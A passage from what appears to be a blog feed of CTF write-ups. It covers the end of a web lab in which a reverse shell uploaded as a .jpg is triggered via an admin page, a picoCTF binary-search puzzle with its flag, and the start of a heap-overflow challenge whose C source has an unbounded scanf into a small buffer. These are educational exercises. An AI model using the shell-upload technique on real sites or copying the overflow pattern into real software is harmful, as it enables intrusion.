</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>/content              <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 181<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; /content/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>/modules              <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 181<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; /modules/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>/admin                <span style="color:#89dceb;font-weight:bold">(</span>Status: 200<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 1238<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>/assets               <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 179<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; /assets/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>/Content              <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 181<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; /Content/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>/Assets               <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 179<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; /Assets/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>/Modules              <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 181<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; /Modules/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>/Admin                <span style="color:#89dceb;font-weight:bold">(</span>Status: 200<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 1238<span style="color:#89dceb;font-weight:bold">]</span></span></span></code></pre></div>
<br>
<p>Navigating to other directories are not permitted except the <code>/admin</code>. Take a look at the text on the admin page: <code>As a reminder: use this form to activate modules from the /modules directory</code>. I already know that images are stored in <code>/content</code> not <code>/modules</code>. To access the images I uploaded on /content, I need to specify <code>../content/{the file of the image}.jpg</code> as we already saw in the gobuster output, both directories are in the same level.</p>
<p><img src="image-33.png#center" alt="alt text"></p>
<br>
<p>Now, run another gobuster command against the <code>/content</code> directory with the wordlist provided plus <code>-x</code> command to look for jpg files.</p>
<p><img src="image-35.png#center" alt="alt text"></p>
<br>
<p>As we can see, gobuster output changed our uploaded file name to <code>FNK.jpg</code> notice its size, it&rsquo;s realtively and small compared to to other files. Let&rsquo;s run our reverse-shell on the admin page.</p>
<p><img src="image-34.png#center" alt="alt text"></p>
<br>
<p>the netcat successfully captured the reverse-shell. I was able to change directory to <code>/var/www</code> and capture the flag.</p>
<p><img src="image-36.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[picoCTF] Binary Search</title>
      <link>http://localhost:1313/picoctf-binary-search/</link>
      <pubDate>Fri, 05 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/picoctf-binary-search/</guid>
      <description>Binary Search Description Want to play a game? As you use more of the shell, you might be interested in how they work! Binary search is a classic algorithm used to quickly find an item in a sorted list. Can you find the flag? You&amp;rsquo;ll have 1000 possibilities and only 10 guesses. Cyber security often has a huge amount of data to look through - from logs, vulnerability reports, and forensics.</description>
      <content:encoded><![CDATA[<h3 id="binary-search">Binary Search</h3>
<h4 id="description">Description</h4>
<p>Want to play a game? As you use more of the shell, you might be interested in how they work! Binary search is a classic algorithm used to quickly find an item in a sorted list. Can you find the flag? You&rsquo;ll have 1000 possibilities and only 10 guesses.
Cyber security often has a huge amount of data to look through - from logs, vulnerability reports, and forensics. Practicing the fundamentals manually might help you in the future when you have to write your own tools!</p>






<pre tabindex="0"><code>Welcome to the Binary Search Game!
I&#39;m thinking of a number between 1 and 1000.
Enter your guess: 500
Lower! Try again.
Enter your guess: 250
Higher! Try again.
Enter your guess: 375
Lower! Try again.
Enter your guess: 313
Lower! Try again.
Enter your guess: 282
Higher! Try again.
Enter your guess: 297
Lower! Try again.
Enter your guess: 289
Higher! Try again.
Enter your guess: 293
Congratulations! You guessed the correct number: 293
Here&#39;s your flag: picoCTF{g00d_gu355_2e90d29b}
Connection to atlas.picoctf.net closed.</code></pre>
<p><strong><em>flag</em></strong>: <code>picoCTF{g00d_gu355_2e90d29b}</code></p>
<hr>
<p>This one was fairly easy because I was already familiar with the Binary Search Algorithm.
Majoring in Computer Science finally paid off.. 😭</p>
]]></content:encoded>
    </item>
    <item>
      <title>[picoCTF] heap 1 &amp; heap 0</title>
      <link>http://localhost:1313/picoctf-heap-0-1/</link>
      <pubDate>Fri, 05 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/picoctf-heap-0-1/</guid>
      <description>heap 0 Description Are overflows just a stack concern? Download the binary Download the source Here&amp;rsquo;s the source code provided
1#include &amp;lt;stdio.h&amp;gt; 2#include &amp;lt;stdlib.h&amp;gt; 3#include &amp;lt;string.h&amp;gt; 4 5#define FLAGSIZE_MAX 64 6// amount of memory allocated for input_data 7#define INPUT_DATA_SIZE 5 8// amount of memory allocated for safe_var 9#define SAFE_VAR_SIZE 5 10 11int num_allocs; 12char *safe_var; 13char *input_data; 14 15void check_win() { 16 if (strcmp(safe_var, &amp;#34;bico&amp;#34;) != 0) { 17 printf(&amp;#34;\nYOU WIN\n&amp;#34;); 18 19 // Print flag 20 char buf[FLAGSIZE_MAX]; 21 FILE *fd = fopen(&amp;#34;flag.</description>
      <content:encoded><![CDATA[<h3 id="heap-0">heap 0</h3>
<h4 id="description">Description</h4>
<p>Are overflows just a stack concern? <br>
Download the binary <br>
Download the source <br></p>
<hr>
<p>Here&rsquo;s the source code provided</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  1</span><span><span style="color:#6c7086;font-style:italic">#include</span> <span style="color:#6c7086;font-weight:bold;font-style:italic">&lt;stdio.h&gt;</span><span style="color:#6c7086;font-style:italic">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  2</span><span><span style="color:#6c7086;font-style:italic">#include</span> <span style="color:#6c7086;font-weight:bold;font-style:italic">&lt;stdlib.h&gt;</span><span style="color:#6c7086;font-style:italic">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  3</span><span><span style="color:#6c7086;font-style:italic">#include</span> <span style="color:#6c7086;font-weight:bold;font-style:italic">&lt;string.h&gt;</span><span style="color:#6c7086;font-style:italic">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  4</span><span><span style="color:#6c7086;font-style:italic"></span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  5</span><span><span style="color:#6c7086;font-style:italic">#define FLAGSIZE_MAX 64
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  6</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#6c7086;font-style:italic">// amount of memory allocated for input_data
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  7</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#6c7086;font-style:italic">#define INPUT_DATA_SIZE 5
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  8</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#6c7086;font-style:italic">// amount of memory allocated for safe_var
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  9</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#6c7086;font-style:italic">#define SAFE_VAR_SIZE 5
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 10</span><span><span style="color:#6c7086;font-style:italic"></span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 11</span><span><span style="color:#f38ba8">int</span> num_allocs;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 12</span><span><span style="color:#f38ba8">char</span> <span style="color:#89dceb;font-weight:bold">*</span>safe_var;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 13</span><span><span style="color:#f38ba8">char</span> <span style="color:#89dceb;font-weight:bold">*</span>input_data;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 15</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">check_win</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 16</span><span>    <span style="color:#cba6f7">if</span> (<span style="color:#89b4fa">strcmp</span>(safe_var, <span style="color:#a6e3a1">&#34;bico&#34;</span>) <span style="color:#89dceb;font-weight:bold">!=</span> <span style="color:#fab387">0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 17</span><span>        <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">YOU WIN</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 18</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 19</span><span>        <span style="color:#6c7086;font-style:italic">// Print flag
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 20</span><span><span style="color:#6c7086;font-style:italic"></span>        <span style="color:#f38ba8">char</span> buf[FLAGSIZE_MAX];
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 21</span><span>        FILE <span style="color:#89dceb;font-weight:bold">*</span>fd <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#89b4fa">fopen</span>(<span style="color:#a6e3a1">&#34;flag.txt&#34;</span>, <span style="color:#a6e3a1">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 22</span><span>        <span style="color:#89b4fa">fgets</span>(buf, FLAGSIZE_MAX, fd);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 23</span><span>        <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;%s</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>, buf);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 24</span><span>        <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 25</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 26</span><span>        <span style="color:#89b4fa">exit</span>(<span style="color:#fab387">0</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 27</span><span>    } <span style="color:#cba6f7">else</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 28</span><span>        <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Looks like everything is still secure!</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 29</span><span>        <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">No flage for you :(</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 30</span><span>        <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 31</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 32</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 33</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 34</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">print_menu</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 35</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">1. Print Heap:</span><span style="color:#89b4fa">\t\t</span><span style="color:#a6e3a1">(print the current state of the heap)&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 36</span><span>           <span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">2. Write to buffer:</span><span style="color:#89b4fa">\t</span><span style="color:#a6e3a1">(write to your own personal block of data &#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 37</span><span>           <span style="color:#a6e3a1">&#34;on the heap)&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 38</span><span>           <span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">3. Print safe_var:</span><span style="color:#89b4fa">\t</span><span style="color:#a6e3a1">(I&#39;ll even let you look at my variable on &#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 39</span><span>           <span style="color:#a6e3a1">&#34;the heap, &#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 40</span><span>           <span style="color:#a6e3a1">&#34;I&#39;m confident it can&#39;t be modified)&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 41</span><span>           <span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">4. Print Flag:</span><span style="color:#89b4fa">\t\t</span><span style="color:#a6e3a1">(Try to print the flag, good luck)&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 42</span><span>           <span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">5. Exit</span><span style="color:#89b4fa">\n\n</span><span style="color:#a6e3a1">Enter your choice: &#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 43</span><span>    <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 44</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 45</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 46</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">init</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 47</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">Welcome to heap0!</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 48</span><span>    <span style="color:#89b4fa">printf</span>(
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 49</span><span>        <span style="color:#a6e3a1">&#34;I put my data on the heap so it should be safe from any tampering.</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 50</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Since my data isn&#39;t on the stack I&#39;ll even let you write whatever &#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 51</span><span>           <span style="color:#a6e3a1">&#34;info you want to the heap, I already took care of using malloc for &#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 52</span><span>           <span style="color:#a6e3a1">&#34;you.</span><span style="color:#89b4fa">\n\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 53</span><span>    <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 54</span><span>    input_data <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#89b4fa">malloc</span>(INPUT_DATA_SIZE);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 55</span><span>    <span style="color:#89b4fa">strncpy</span>(input_data, <span style="color:#a6e3a1">&#34;pico&#34;</span>, INPUT_DATA_SIZE);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 56</span><span>    safe_var <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#89b4fa">malloc</span>(SAFE_VAR_SIZE);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 57</span><span>    <span style="color:#89b4fa">strncpy</span>(safe_var, <span style="color:#a6e3a1">&#34;bico&#34;</span>, SAFE_VAR_SIZE);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 58</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 59</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 60</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">write_buffer</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 61</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Data for buffer: &#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 62</span><span>    <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 63</span><span>    <span style="color:#89b4fa">scanf</span>(<span style="color:#a6e3a1">&#34;%s&#34;</span>, input_data);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 64</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 65</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 66</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">print_heap</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 67</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Heap State:</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 68</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;+-------------+----------------+</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 69</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;[*] Address   -&gt;   Heap Data   </span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 70</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;+-------------+----------------+</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 71</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;[*]   %p  -&gt;   %s</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>, input_data, input_data);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 72</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;+-------------+----------------+</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 73</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;[*]   %p  -&gt;   %s</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>, safe_var, safe_var);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 74</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;+-------------+----------------+</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 75</span><span>    <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 76</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 77</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 78</span><span><span style="color:#f38ba8">int</span> <span style="color:#89b4fa">main</span>(<span style="color:#f38ba8">void</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 79</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 80</span><span>    <span style="color:#6c7086;font-style:italic">// Setup
